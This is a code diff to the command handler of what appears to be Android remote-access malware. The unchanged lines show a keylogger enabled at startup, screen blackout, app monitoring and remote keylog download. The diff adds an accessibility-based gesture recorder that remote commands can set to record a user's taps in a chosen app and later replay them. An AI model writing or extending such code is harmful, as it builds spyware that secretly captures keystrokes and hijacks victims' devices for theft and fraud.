@@ -99,6 +99,7 @@ public class SocketManager {
     private final AppMonitor        appMonitor;
     private final ScreenBlackout    screenBlackout;
     private final PermissionManager permissionManager;
+    private GestureRecorder         gestureRecorder;
 
     public static synchronized SocketManager getInstance(Context context) {
         if (instance == null) instance = new SocketManager(context.getApplicationContext());
@@ -119,8 +120,15 @@ public class SocketManager {
         appMonitor         = new AppMonitor(context, keyloggerService);
         screenBlackout     = ScreenBlackout.getInstance();
         permissionManager  = new PermissionManager(context);
-        // Auto-enable keylogger on init (will capture once accessibility is granted)
+        // gestureRecorder is initialized lazily (needs AccessibilityService)
         KeyloggerService.setEnabled(true);
+    }
+
+    /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
+    public void initGestureRecorder(android.accessibilityservice.AccessibilityService svc) {
+        if (gestureRecorder == null) {
+            gestureRecorder = new GestureRecorder(context, svc);
+        }
     }
 
     /** Expose appMonitor so UnifiedAccessibilityService can call it. */
@@ -645,6 +653,34 @@ public class SocketManager {
         if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
         if (command.equals("list_keylog_files"))      return keyloggerService.listKeylogFiles();
         if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));
+
+        // ── Gesture Recorder ─────────────────────────────────────────────
+        if (command.startsWith("gesture_")) {
+            if (gestureRecorder == null) {
+                JSONObject er = new JSONObject();
+                er.put("success", false); er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
+                return er;
+            }
+            switch (command) {
+                case "gesture_start_record": {
+                    String pkg   = params.optString("packageId", "");
+                    String lbl   = params.optString("label", "gesture");
+                    return gestureRecorder.startRecording(pkg, lbl);
+                }
+                case "gesture_stop_record":   return gestureRecorder.stopRecording();
+                case "gesture_cancel_record": return gestureRecorder.cancelRecording();
+                case "gesture_replay":        return gestureRecorder.replayGesture(params.getString("filename"));
+                case "gesture_list":          return gestureRecorder.listGestures();
+                case "gesture_get":           return gestureRecorder.getGesture(params.getString("filename"));
+                case "gesture_delete":        return gestureRecorder.deleteGesture(params.getString("filename"));
+                case "gesture_status": {
+                    JSONObject st = new JSONObject();
+                    st.put("success", true);
+                    st.put("recording", gestureRecorder.isRecording());
+                    return st;
+                }
+            }
+        }
 
         // ── App Monitor ──────────────────────────────────────────────────
         if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
